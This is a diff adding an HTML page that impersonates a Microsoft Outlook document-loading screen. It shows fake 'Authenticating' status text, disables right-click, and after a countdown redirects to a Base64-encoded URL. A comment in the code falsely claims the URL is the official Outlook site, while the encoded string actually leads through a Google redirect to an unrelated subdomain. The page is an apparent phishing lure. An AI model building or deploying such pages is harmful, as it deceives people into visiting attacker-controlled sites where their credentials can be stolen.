@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Outlook Loading</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* (all styles remain unchanged) */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .bg-bubble {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            animation: float 15s infinite linear;
+        }
+        
+        .bg-bubble:nth-child(1) {
+            width: 80px;
+            height: 80px;
+            top: 10%;
+            left: 20%;
+            animation-delay: 0s;
+        }
+        
+        .bg-bubble:nth-child(2) {
+            width: 120px;
+            height: 120px;
+            top: 60%;
+            left: 70%;
+            animation-delay: -5s;
+        }
+        
+        .bg-bubble:nth-child(3) {
+            width: 60px;
+            height: 60px;
+            top: 30%;
+            left: 80%;
+            animation-delay: -10s;
+        }
+        
+        .bg-bubble:nth-child(4) {
+            width: 100px;
+            height: 100px;
+            top: 70%;
+            left: 10%;
+            animation-delay: -7s;
+        }
+        
+        .loading-container {
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 40px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
+            max-width: 500px;
+            width: 90%;
+            z-index: 10;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            transform: translateY(0);
+            transition: transform 0.3s ease;
+        }
+        
+        .loading-container:hover {
+            transform: translateY(-5px);
+        }
+        
+        .logo-animation {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 25px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .outlook-logo {
+            position: absolute;
+            width: 80px;
+            height: 60px;
+            background: #fff;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            z-index: 2;
+        }
+        
+        .outlook-logo:before {
+            content: '';
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            background: #0078d4;
+            border-radius: 50%;
+        }
+        
+        .outlook-logo:after {
+            content: '';
+            position: absolute;
+            width: 15px;
+            height: 15px;
+            background: #fff;
+            border-radius: 50%;
+            top: 12px;
+            right: 12px;
+        }
+        
+        .pulse-ring {
+            position: absolute;
+            width: 120px;
+            height: 120px;
+            border: 4px solid rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+            opacity: 0;
+        }
+        
+        .pulse-ring:nth-child(2) {
+            animation-delay: 0.66s;
+        }
+        
+        .pulse-ring:nth-child(3) {
+            animation-delay: 1.33s;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #fff, #a6d5ff);
+            border-radius: 4px;
+            animation: progress 5s ease-in-out forwards;
+            box-shadow: 0 0 10px rgba(166, 213, 255, 0.6);
+        }
+        
+        h1 {
+            font-weight: 300;
+            margin: 0 0 15px;
+            font-size: 28px;
+            letter-spacing: 0.5px;
+        }
+        
+        p {
+            margin: 0 0 20px;
+            opacity: 0.9;
+            font-size: 17px;
+            line-height: 1.5;
+        }
+        
+        .status {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin-top: 15px;
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .redirect-notice {
+            font-size: 15px;
+            opacity: 0.8;
+            margin-top: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .ms-logo {
+            margin-top: 30px;
+            opacity: 0.9;
+        }
+        
+        .theme-toggle {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 100;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 13px;
+            opacity: 0.7;
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(0.8);
+                opacity: 0.8;
+            }
+            100% {
+                transform: scale(1.5);
+                opacity: 0;
+            }
+        }
+        
+        @keyframes progress {
+            0% {
+                width: 0%;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                transform: translateY(-20px) rotate(10deg);
+            }
+            100% {
+                transform: translateY(0) rotate(0deg);
+            }
+        }
+        
+        body.dark {
+            background: linear-gradient(135deg, #1f1f1f 0%, #2b2b2b 100%);
+        }
+        
+        body.dark .loading-container {
+            background-color: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        body.dark .bg-bubble {
+            background: rgba(0, 0, 0, 0.2);
+        }
+        
+        @media (max-width: 600px) {
+            .loading-container {
+                padding: 25px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+            
+            p {
+                font-size: 15px;
+            }
+            
+            .logo-animation {
+                width: 120px;
+                height: 120px;
+            }
+            
+            .outlook-logo {
+                width: 70px;
+                height: 50px;
+            }
+            
+            .pulse-ring {
+                width: 100px;
+                height: 100px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background elements -->
+    <div class="bg-bubble"></div>
+    <div class="bg-bubble"></div>
+    <div class="bg-bubble"></div>
+    <div class="bg-bubble"></div>
+    
+    <!-- Theme toggle -->
+    <div class="theme-toggle" id="themeToggle">
+        <i class="fas fa-moon"></i>
+    </div>
+    
+    <!-- Main content -->
+    <div class="loading-container">
+        <div class="logo-animation">
+            <div class="outlook-logo"></div>
+            <div class="pulse-ring"></div>
+            <div class="pulse-ring"></div>
+            <div class="pulse-ring"></div>
+        </div>
+        
+        <h1>Microsoft Outlook</h1>
+        <p>Loading your document, please wait...</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        
+        <div class="status">
+            <span>Initializing</span>
+            <span>Connecting to server...</span>
+        </div>
+        
+        <p class="redirect-notice">
+            <i class="fas fa-clock"></i>
+            You will be redirected in <span id="countdown">5</span> seconds
+        </p>
+        
+        <div class="ms-logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="90" height="18" viewBox="0 0 90 18">
+                <path fill="#ffffff" d="M44.59 7.56h3.05v7.3h-3.05zM53.33 7.56h3.04v7.3h-3.04zM44.59 3.07h3.05v3.05h-3.05zM53.33 3.07h3.04v3.05h-3.04z"/>
+                <path fill="#f25022" d="M0 0h20v20H0z"/>
+                <path fill="#7fba00" d="M25 0h20v20H25z"/>
+                <path fill="#00a4ef" d="M50 0h20v20H50z"/>
+                <path fill="#ffb900" d="M75 0h20v20H75z"/>
+            </svg>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>Microsoft Outlook &copy; 2026 Microsoft Corporation. All rights reserved.</p>
+    </div>
+
+    <script>
+        // Disable right‑click
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // Theme toggle functionality
+        const themeToggle = document.getElementById('themeToggle');
+        const body = document.body;
+        
+        if (localStorage.getItem('theme') === 'dark') {
+            body.classList.add('dark');
+            themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
+        }
+        
+        themeToggle.addEventListener('click', () => {
+            body.classList.toggle('dark');
+            if (body.classList.contains('dark')) {
+                localStorage.setItem('theme', 'dark');
+                themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
+            } else {
+                localStorage.setItem('theme', 'light');
+                themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
+            }
+        });
+        
+        // SAFE REDIRECT – Official Microsoft Outlook (Base64 encoded)
+        // Encoded URL: https://outlook.office.com/mail/
+        const encodedUrl = 'aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw/cT1odHRwcyUzQSUyRiUyRnZpZXctNmVwZDEwazA4LnNlcm5pZHdlc3QuY29tJTJGJnNhPUQmc250ej0xJnVzZz1BT3ZWYXcwNnI4aGtISURiNDRzOEdWRklfZEkt';
+        const destinationUrl = atob(encodedUrl); // Decode to plain URL
+        
+        // Countdown set to 5 seconds
+        let seconds = 5;
+        const countdownElement = document.getElementById('countdown');
+        
+        const countdownInterval = setInterval(() => {
+            seconds--;
+            countdownElement.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
+        
+        // Simulate status updates
+        setTimeout(() => {
+            document.querySelector('.status span').textContent = 'Authenticating';
+        }, 500);
+        
+        setTimeout(() => {
+            document.querySelector('.status span:last-child').textContent = 'Loading Document...';
+        }, 1200);
+        
+        // Redirect after 5 seconds using the decoded URL
+        setTimeout(() => {
+            window.location.href = destinationUrl;
+        }, 5000);
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"96a8f84b0678428881275803b4b8d36d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+<br /> <!--Start Blocking the mouse (by Samtechs)--><br /> <body oncontextmenu ="return false;"><br /> <!--end blocking the mouse-->
+</html>
